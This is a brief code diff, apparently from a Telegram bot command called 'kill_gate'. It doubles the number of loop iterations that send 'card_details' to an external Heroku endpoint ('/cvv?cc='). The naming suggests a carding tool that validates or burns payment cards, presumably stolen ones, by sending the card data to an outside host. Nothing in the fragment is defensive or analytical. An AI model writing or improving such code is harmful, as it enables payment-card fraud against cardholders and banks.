@@ -73,7 +73,7 @@ def kill_gate(client, message):
 
     final_result = ""
 
-    for i in range(5):
+    for i in range(10):
         time.sleep(1)
 
         url = f"https://ugin-376ec3a40d16.herokuapp.com/cvv?cc={card_details}"
